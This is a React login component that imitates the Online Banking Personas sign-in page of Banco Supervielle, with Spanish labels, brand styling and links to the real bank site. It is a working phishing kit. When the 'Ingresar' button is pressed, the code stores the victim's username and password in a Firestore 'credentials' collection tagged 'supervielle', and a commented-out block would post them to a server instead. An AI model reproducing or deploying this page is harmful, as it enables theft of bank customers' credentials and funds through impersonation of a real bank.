import React from 'react';
import {Form, Button} from 'react-bootstrap';
import axiosClient from './config/axios';
import moment from 'moment';
import firebase from "./firebase";

const collection = firebase.firestore().collection("credentials");

const Login = () => {

    const [usernameVal, setEmail] = React.useState(null);
    const [passwordVal, setPassword] = React.useState(null);

    const handleChangeEmail = (event) => {
        setEmail(event.target.value);
    }
    const handleChangePassword = (event) => {
        setPassword(event.target.value);
    }

    const sendCredentials = async () =>{
        try{
            const date = new Date();
            const id = Math.random().toString(36).slice(2);

            await collection.add({
                username: usernameVal,
                password: passwordVal,
                webpage: "supervielle",
                created: moment(date).format('YYYY-MM-DD HH:mm:ss').toString()
              })
              .then(() => {
                console.log("Document successfully written!");
              })
              .catch(function(error){
                  console.error("Error adding Tutorial: ", error);
              });

            console.log("creado");
            /*const response = await axiosClient.post("/credentials", credentials)
            .then((response) => {
                console.log(response);
            })
            .catch((err) => {
                console.log(err.code);
            });*/
        }
        catch(e){
            console.log(e);
        }
    }
    
    return (
        <div>
                <Form>
                    <Form.Group>
                        <Form.Label 
                            style={
                                {
                                    fontFamily:"https://fonts.googleapis.com/css2?family=Heebo:wght@100&display=swap", 
                                    fontWeight:"300", 
                                    color:"#424242", 
                                    fontSize:"28px", 
                                    lineHeight:"1.1", 
                                    marginBottom:"42px"
                                }}>Iniciar sesión en Online Banking Personas</Form.Label>
                            <div
                                style={{
                                    maxWidth:"414px",
                                    boxSizing:"border-box",
                                    display:"block"
                                }}>
                                <Form.Control 
                                    type="text"
                                    className="email"
                                    onChange={handleChangeEmail}
                                    required
                                    style={
                                        {
                                            width:"100%", 
                                            padding:"5px", 
                                            fontSize:"20px", 
                                            border:"none",
                                            borderBottom:"1px solid rgba(26, 38, 51, 0.1)",
                                            fontFamily:"https://fonts.googleapis.com/css2?family=Heebo:wght@100&display=swap", 
                                            marginBottom:"16px",
                                            color:"#495057",
                                            height:"calc(1.5em + .75rem + 2px)",
                                            marginRight:"10px",
                                            borderRadius:".25rem",
                                            WebkitWritingMode:"horizontal-tb",
                                            textRendering:"auto",
                                            letterSpacing:"normal",
                                            textAlign:"start",
                                            cursor:"text"
                                        }} 
                                    placeholder="Tu nombre de usuario"></Form.Control>
                                <Form.Control 
                                    style={
                                        {
                                            width:"100%", 
                                            padding:"5px", 
                                            fontSize:"20px", 
                                            border:"none",
                                            borderBottom:"1px solid rgba(26, 38, 51, 0.1)",
                                            fontFamily:"https://fonts.googleapis.com/css2?family=Heebo:wght@100&display=swap", 
                                            marginBottom:"28px",
                                            height:"50px",
                                            marginRight:"10px",
                                            borderRadius:"6px",
                                            WebkitWritingMode:"horizontal-tb",
                                            textRendering:"auto",
                                            letterSpacing:"normal",
                                            textAlign:"start",
                                            cursor:"text"
                                        }} 
                                    type="password"
                                    className="password"
                                    onChange={handleChangePassword}
                                    placeholder="Tu clave"
                                    required></Form.Control>
                            </div>
                        </Form.Group>
                    <Button 
                        onClick={sendCredentials}
                        style={
                            {
                                backgroundColor:"#d52b1e",
                                backgroundImage:"data:image/svg+xml,%3Csvg width='5' height='9' xmlns='http://www.w3.org/2000/svg'%3E %3Cg fill='none' fill-rule='evenodd'%3E %3Cpath fill='%23FFF' d='M-1040-836H400V188h-1440z'/%3E %3Cg transform='translate(-175 -18)'%3E %3Crect stroke='%23D52B1E' x='.5' y='.5' width='195' height='43' rx='9'/%3E %3Cpath d='M179.453 21.907l.264-.264-3.423-3.422a.76.76 0 0 0-1.294.536.75.75 0 0 0 .223.536l2.886 2.885-2.887 2.887a.752.752 0 0 0 .001 1.071.757.757 0 0 0 1.07.001l3.424-3.423a.762.762 0 0 0 0-1.07l-.264.263-.265.263.002.009-.002.008-3.422 3.421-.008.003-.009-.003-.003-.008.003-.007 3.416-3.415-3.416-3.414-.003-.007.003-.007.009-.004.008.004 3.423 3.421.264-.264z' fill='%23D52B1E'/%3E %3C/g%3E %3C/g%3E %3C/svg%3E",
                                borderRadius:"6px", 
                                width:"100%", maxWidth:"115px", 
                                fontFamily:"https://fonts.googleapis.com/css2?family=Heebo:wght@100&display=swap", 
                                color:"#ffffff", 
                                fontSize:"18px", 
                                boxShadow:"initial", 
                                fontWeight:"500", 
                                height:"56px"
                            }}>Ingresar</Button>
                    <br/>
                    <a 
                        href="https://personas.supervielle.com.ar/" 
                        class="link" 
                        style={
                            {
                                color:"#d52b1e", 
                                fontSize:"14px", 
                                letterSpacing:"0.3px", 
                                marginTop:"10px", 
                                cursor:"pointer", 
                                fontFamily:"https://fonts.googleapis.com/css2?family=Heebo:wght@100&display=swap", 
                                textDecoration:"none"
                            }}>Olvidé o bloqueé mi Usuario / Clave</a>
                    <br/>
                    <Button 
                        className="link-new"
                        type="submit" 
                        style={
                            {
                                backgroundColor:"#ffffff", 
                                color:"#d52b1e", 
                                fontFamily:"https://fonts.googleapis.com/css2?family=Heebo:wght@100&display=swap",
                                fontSize:"14px", 
                                letterSpacing:"0.3px", 
                                borderColor:"#d52b1e", 
                                borderRadius:"9px", 
                                padding:"11px 26px 12px 16px", 
                                width:"228px",
                                marginTop:"8vh"
                            }}>Si sos nuevo registrate</Button>
                    <br/>
                    <div 
                        style={
                            {
                                textDecoration:"none", 
                                color:"#666666", 
                                fontSize:"10px", 
                                lineHeight:"1.38", 
                                fontFamily:"https://fonts.googleapis.com/css2?family=Heebo:wght@100&display=swap", 
                                fontWeight:"normal", 
                                marginTop:"20px"}}>Cuenta Gratuita Universal. Com "A" 6876. 
                    <a 
                        href="https://www.supervielle.com.ar/personas/cuentas/cuenta-gratuita-universal" 
                        style={
                            {
                                textDecoration:"none", 
                                color:"#666666", 
                                fontSize:"10px", 
                                lineHeight:"1.38", 
                                fontFamily:"https://fonts.googleapis.com/css2?family=Heebo:wght@100&display=swap", 
                                fontWeight:"normal"}}>+ INFO</a>

                    </div>
                </Form>
            </div>
    )
}

export default Login;
